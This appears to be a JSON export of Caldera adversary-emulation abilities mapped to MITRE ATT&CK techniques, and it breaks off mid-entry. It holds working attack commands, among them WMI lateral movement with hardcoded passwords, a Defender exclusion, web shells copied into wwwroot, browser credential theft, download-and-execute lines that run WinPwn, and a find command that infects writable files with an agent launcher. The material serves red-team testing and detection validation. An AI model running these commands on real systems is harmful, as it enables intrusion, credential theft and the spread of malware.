[{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["wmic process where name='notepad.exe' delete >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "wmic process call create notepad.exe", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Windows Management Instrumentation", "ability_id": "9712e4aabe914d8a978ceb8c787f93a7", "technique_id": "T1047", "tactic": "execution", "requirements": [], "name": "WMI Execute Local Process", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test uses wmic.exe to execute a process on a remote host. Specify a valid value for remote IP using the node parameter.\nTo clean up, provide the same node input as the one provided to run the test\nA common error message is \"Node - (provided IP or default)  ERROR Description =The RPC server is unavailable\" if the default or provided IP is unreachable\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["wmic /user:DOMAIN\\Administrator /password:P@ssw0rd1 /node:\"127.0.0.1\" process where name='notepad.exe' delete >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "wmic /user:DOMAIN\\Administrator /password:P@ssw0rd1 /node:\"127.0.0.1\" process call create notepad.exe", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Windows Management Instrumentation", "ability_id": "fd43e89c476ae8a53cdc25143977e070", "technique_id": "T1047", "tactic": "execution", "requirements": [], "name": "WMI Execute Remote Process", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test uses wmic.exe to execute a DLL function using rundll32. Specify a valid value for remote IP using the node parameter.\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["taskkill /f /im calculator.exe"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "wmic /node:127.0.0.1 process call create \"rundll32.exe $env:TEMP\\calc.dll StartW\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Windows Management Instrumentation", "ability_id": "52bcd9532d677ff09b834956a0b3ea75", "technique_id": "T1047", "tactic": "execution", "requirements": [], "name": "WMI Execute rundll32", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Create an scheduled task that executes notepad.exe after user login from XML by leveraging WMI class PS_ScheduledTask. Does the same thing as Register-ScheduledTask cmdlet behind the scenes.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["2cc1c4_T1053_005_WMI.xml"], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Unregister-ScheduledTask -TaskName \"T1053_005_WMI\" -confirm:$false >$null 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$xml = [System.IO.File]::ReadAllText(\"2cc1c4_T1053_005_WMI.xml\"); Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace \"Root\\Microsoft\\Windows\\TaskScheduler\" -MethodName \"RegisterByXml\" -Arguments @{ Force = $true; Xml =$xml; }", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Scheduled Task/Job: Scheduled Task", "ability_id": "5bfd20d7a230f8472d78362fd2b9416f", "technique_id": "T1053.005", "tactic": "multiple", "requirements": [], "name": "WMI Invoke-CimMethod Scheduled Task", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The following Atomic will create a New-CimSession on a remote endpoint and start a process usnig Invoke-CimMethod.\nThis is a novel way to perform lateral movement or to start a remote process.\nThis does require WinRM to be enabled. The account performing the run will also need to be elevated.\nA successful execution will stdout that the process started. On the remote endpoint, wmiprvse.exe will spawn the given process.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$RemoteComputer = \"localhost\";  $PWord = ConvertTo-SecureString -String \"P@ssword1\" -AsPlainText -Force;  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"Administrator\", $Pword;  $CimSession = New-CimSession -ComputerName $RemoteComputer -Credential $Credential;  $ProcessToStart = \"calc.exe\";  $Result = Invoke-CimMethod -CimSession $CimSession -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $ProcessToStart};  if ($Result.ReturnValue -eq 0) {;      Write-Host \"Process started successfully with Process ID: $($Result.ProcessId)\";  } else {;      Write-Host \"Failed to start the process. Error code: $($Result.ReturnValue)\";  };  Remove-CimSession -CimSession $CimSession", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Event Triggered Execution", "ability_id": "6fb0cdea444d58a340896d606baf281a", "technique_id": "T1546", "tactic": "multiple", "requirements": [], "name": "WMI Invoke-CimMethod Start Process", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "An adversary might use WMI to check if a certain Remote Service is running on a remote device. \nWhen the test completes, a service information will be displayed on the screen if it exists.\nA common feedback message is that \"No instance(s) Available\" if the service queried is not running.\nA common error message is \"Node - (provided IP or default)  ERROR Description =The RPC server is unavailable\" \nif the provided remote host is unreacheable\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "wmic /node:\"127.0.0.1\" service where (caption like \"%Spooler%\")", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Windows Management Instrumentation", "ability_id": "e9d6ab093c65f521e9d900b9dc9eca28", "technique_id": "T1047", "tactic": "execution", "requirements": [], "name": "WMI Reconnaissance List Remote Services", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "An adversary might use WMI to list Processes running on the compromised host.\nWhen the test completes , there should be running processes listed on the command line.\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "wmic process get caption,executablepath,commandline /format:csv", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Windows Management Instrumentation", "ability_id": "ac2764f7a67a9ce92b54e8e59b361838", "technique_id": "T1047", "tactic": "execution", "requirements": [], "name": "WMI Reconnaissance Processes", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "An adversary might use WMI to list installed Software hotfix and patches.\nWhen the test completes, there should be a list of installed patches and when they were installed.\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "wmic qfe get description,installedOn /format:csv", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Windows Management Instrumentation", "ability_id": "ed736a123da6fb2aab22cfd4f437e8b5", "technique_id": "T1047", "tactic": "execution", "requirements": [], "name": "WMI Reconnaissance Software", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "An adversary might use WMI to list all local User Accounts. \nWhen the test completes , there should be local user accounts information displayed on the command line.\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "wmic useraccount get /ALL /format:csv", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Windows Management Instrumentation", "ability_id": "b0255b5120cbabc062d8d4510a142c3b", "technique_id": "T1047", "tactic": "execution", "requirements": [], "name": "WMI Reconnaissance Users", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes an MSI containing an embedded DLL using the WMI Win32_Product class\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Invoke-CimMethod -ClassName Win32_Product -MethodName", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: Msiexec", "ability_id": "3e29fb41fe9d7dd07fbe9adadee8b1da", "technique_id": "T1218.007", "tactic": "defense-evasion", "requirements": [], "name": "WMI Win32_Product Class - Execute Local MSI file with an embedded DLL", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes an MSI containing an embedded EXE using the WMI Win32_Product class\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Invoke-CimMethod -ClassName Win32_Product -MethodName", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: Msiexec", "ability_id": "f01d06af8bd1a70684c2bbb341f90eb3", "technique_id": "T1218.007", "tactic": "defense-evasion", "requirements": [], "name": "WMI Win32_Product Class - Execute Local MSI file with an embedded EXE", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes an MSI containing embedded JScript code using the WMI Win32_Product class\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Invoke-CimMethod -ClassName Win32_Product -MethodName", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: Msiexec", "ability_id": "2a971043ed3c06eac6b8cf496f706b46", "technique_id": "T1218.007", "tactic": "defense-evasion", "requirements": [], "name": "WMI Win32_Product Class - Execute Local MSI file with embedded JScript", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes an MSI containing embedded VBScript code using the WMI Win32_Product class\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Invoke-CimMethod -ClassName Win32_Product -MethodName", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: Msiexec", "ability_id": "f7144396fff68187217107bf2bc39600", "technique_id": "T1218.007", "tactic": "defense-evasion", "requirements": [], "name": "WMI Win32_Product Class - Execute Local MSI file with embedded VBScript", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Capture process id, executable path, pid and parent pid before writing to disk", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "wmic process get executablepath,name,processid,parentprocessid >> $env:APPDATA\\vmtools.log;\ncat $env:APPDATA\\vmtools.log", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "WMIC", "ability_id": "94f21386-9547-43c4-99df-938ab05d45ce", "technique_id": "T1047", "tactic": "collection", "requirements": [], "name": "WMIC Process Enumeration", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The following Atomic will attempt to exclude a folder within Defender leveraging WMI\nReference: https://www.bleepingcomputer.com/news/security/gootkit-malware-bypasses-windows-defender-by-setting-path-exclusions/\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["wmic.exe /Namespace:\\\\root\\Microsoft\\Windows\\Defender class MSFT_MpPreference call Remove ExclusionPath=\\\"ATOMICREDTEAM\\\""], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "wmic.exe /Namespace:\\\\root\\Microsoft\\Windows\\Defender class MSFT_MpPreference call Add ExclusionPath=\\\"ATOMICREDTEAM\\\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify Tools", "ability_id": "58e980270c575e1e3b3c782976efa93d", "technique_id": "T1562.001", "tactic": "defense-evasion", "requirements": [], "name": "WMIC Tamper with Windows Defender Evade Scanning Folder", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes the code specified within a XSL script using a local payload.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["e3e9ba_wmicscript.xsl"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "wmic process list /FORMAT:\"e3e9ba_wmicscript.xsl\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "XSL Script Processing", "ability_id": "c71ae2939195beabaf5fe020c958978d", "technique_id": "T1220", "tactic": "defense-evasion", "requirements": [], "name": "WMIC bypass using local XSL file", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes the code specified within a XSL script using a remote payload. Open Calculator.exe when test successfully executed, while AV turned off.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "wmic process list /FORMAT:\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "XSL Script Processing", "ability_id": "f241bda59261f9930621f38d5ed42abf", "technique_id": "T1220", "tactic": "defense-evasion", "requirements": [], "name": "WMIC bypass using remote XSL file", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Utilizing PowerShell cmdlet - get-wmiobject, to enumerate local groups on the endpoint. Upon execution, Upon execution, information will be displayed of local groups on system.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Get-WMIObject Win32_Group", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Permission Groups Discovery: Local Groups", "ability_id": "e541c2b62c3259680863a6f3b410e59a", "technique_id": "T1069.001", "tactic": "discovery", "requirements": [], "name": "WMIObject Group Discovery", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Locate and infect files with weak but executable perms", "repeatable": false, "privilege": "", "buckets": ["privilege-escalation"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["sandcat.go"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "find / -type f -size -500k -maxdepth 5 -perm -333 2>/dev/null -exec sh -c 'grep -qF \"54NDC47_SCRIPT\" \"{}\" || echo \"#54NDC47_SCRIPT\\n\" \"chmod +x sandcat.go-darwin && sandcat.go-darwin\" >> \"{}\"; ls \"{}\" ' \\; | echo \"complete\"", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": ["sandcat.go"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "find / -type f -size -500k -maxdepth 5 -perm -333 2>/dev/null -exec sh -c 'grep -qF \"54NDC47_SCRIPT\" \"{}\" || echo \"#54NDC47_SCRIPT\\n\" \"chmod +x sandcat.go-linux && sandcat.go-linux\" >> \"{}\"; ls \"{}\" ' \\; | echo \"complete\"", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Hijack Execution Flow: Services File Permissions Weakness", "ability_id": "10681f2f-be03-44af-858d-f2b0812df185", "technique_id": "T1574.010", "tactic": "privilege-escalation", "requirements": [], "name": "Weak executable files", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test simulates an adversary leveraging Web Shells by simulating the file modification to disk.\nIdea from APTSimulator.\ncmd.aspx source - https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx\n", "repeatable": false, "privilege": "", "buckets": ["persistence"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["del C:\\inetpub\\wwwroot\\b.jsp /q >nul 2>&1 && del C:\\inetpub\\wwwroot\\tests.jsp /q >nul 2>&1 && del C:\\inetpub\\wwwroot\\cmd.aspx /q >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "xcopy /I /Y PathToAtomicsFolder\\T1505.003\\src C:\\inetpub\\wwwroot", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Server Software Component: Web Shell", "ability_id": "300ce4eae0a89518065bb58178c8703f", "technique_id": "T1505.003", "tactic": "persistence", "requirements": [], "name": "Web Shell Written to Disk", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The following Atomic test utilizes WebBrowserPassView to extract passwords from browsers on a Window system. WebBrowserPassView is an open source application used to retrieve passwords stored on a local computer. Recently noticed as a tool used in the BlackCat Ransomware.", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["f3d204_WebBrowserPassView.exe"], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Start-Process f3d204_WebBrowserPassView.exe; Start-Sleep -Second 4; Stop-Process -Name \"WebBrowserPassView\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Credentials from Password Stores: Credentials from Web Browsers", "ability_id": "08c8ac512b422e66e7ec398f60f02645", "technique_id": "T1555.003", "tactic": "credential-access", "requirements": [], "name": "WebBrowserPassView - Credentials from Browser", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test discovers users who have authenticated against a Domain Controller via NTLM. \nThis is done remotely via wmic and captures the event code 4776 from the domain controller and stores the ouput in C:\\temp. [Reference](https://www.reliaquest.com/blog/socgholish-fakeupdates/)\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item -Path \\\\$IpAddress\\c$\\ntlmusers.evtx"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$target = $env:LOGONSERVER; $target = $target.Trim(\"\\\\\"); $IpAddress = [System.Net.Dns]::GetHostAddresses($target) | select IPAddressToString -ExpandProperty IPAddressToString; wmic.exe /node:$IpAddress process call create 'wevtutil epl Security C:\\\\ntlmusers.evtx /q:\\\"Event[System[(EventID=4776)]]\"'", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Account Discovery: Domain Account", "ability_id": "ffe23675b3b68eb6d2b6e771451de3af", "technique_id": "T1087.002", "tactic": "discovery", "requirements": [], "name": "Wevtutil - Discover NTLM Users Remote", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "An adversary will want to discover what shell is running so that they can tailor their attacks accordingly. The following commands will discover what shell is running.\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.acrn", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "shell.info"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "echo $0; if $(env |grep \"SHELL\" >/dev/null); then env |grep \"SHELL\"; fi; if $(printenv SHELL >/dev/null); then printenv SHELL; fi", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: Bash", "ability_id": "181d6efe03889f7c26073257a90c4a1e", "technique_id": "T1059.004", "tactic": "execution", "requirements": [], "name": "What shell is running", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "An adversary may want to discover which shell's are available so that they might switch to that shell to tailor their attacks to suit that shell. The following commands will discover what shells are available on the host.\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.acrn", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "shell.info"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "cat /etc/shells", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: Bash", "ability_id": "ba3f3acd2d5a1429dfc2e4612b1a8953", "technique_id": "T1059.004", "tactic": "execution", "requirements": [], "name": "What shells are available", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Perform peripheral device discovery using Get-WMIObject Win32_PnPEntity", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item $env:TEMP\\T1120_collection.txt -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Get-WMIObject Win32_PnPEntity | Format-Table Name, Description, Manufacturer > $env:TEMP\\T1120_collection.txt; $Space,$Heading,$Break,$Data = Get-Content $env:TEMP\\T1120_collection.txt; @($Heading; $Break; $Data |Sort-Object -Unique) | ? {$_.trim() -ne \"\" } |Set-Content $env:TEMP\\T1120_collection.txt", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Peripheral Device Discovery", "ability_id": "7b9c7afaefa59aab759b49af0d699ac1", "technique_id": "T1120", "tactic": "discovery", "requirements": [], "name": "Win32_PnPEntity Hardware Inventory", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Collect Browser credentials as well as the history via winpwn browserpwn function of WinPwn.", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["rm .\\System.Data.SQLite.dll -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); browserpwn -consoleoutput -noninteractive", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Credentials from Password Stores: Credentials from Web Browsers", "ability_id": "954860df5054a5fabc114abefd8e45f6", "technique_id": "T1555.003", "tactic": "credential-access", "requirements": [], "name": "WinPwn - BrowserPwn", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "DomainPasswordSpray Attacks technique via function of WinPwn", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); domainpassspray -consoleoutput -noninteractive -emptypasswords", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Brute Force: Password Spraying", "ability_id": "7532005da662bfc703ce3d8ef4e8ac70", "technique_id": "T1110.003", "tactic": "credential-access", "requirements": [], "name": "WinPwn - DomainPasswordSpray Attacks", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Search for .NET Service-Binaries on this system via winpwn dotnet function of WinPwn.", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); dotnet -consoleoutput -noninteractive", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Software Discovery", "ability_id": "0954576f69ca8e140f2cdc9e58b36ff9", "technique_id": "T1518", "tactic": "discovery", "requirements": [], "name": "WinPwn - DotNet", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Search for any .NET binary file in a share using the Dotnetsearch function of WinPwn", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); Dotnetsearch -noninteractive -consoleoutput", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Software Discovery", "ability_id": "beafe61e6874eb9eec2119bd12255193", "technique_id": "T1518", "tactic": "discovery", "requirements": [], "name": "WinPwn - Dotnetsearch", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Check domain Group policies for common misconfigurations using Grouper2 via GPOAudit function of WinPwn", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); GPOAudit -noninteractive -consoleoutput", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Group Policy Discovery", "ability_id": "a3c8fba61f02a7b96306b87121b2ac4b", "technique_id": "T1615", "tactic": "discovery", "requirements": [], "name": "WinPwn - GPOAudit", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Enumerate remote access policies through group policy using GPORemoteAccessPolicy function of WinPwn", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); GPORemoteAccessPolicy -consoleoutput -noninteractive", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Group Policy Discovery", "ability_id": "834e861bba95b87d066e84c5c6b056a0", "technique_id": "T1615", "tactic": "discovery", "requirements": [], "name": "WinPwn - GPORemoteAccessPolicy", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "General privesc checks using the otherchecks function of WinPwn", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, 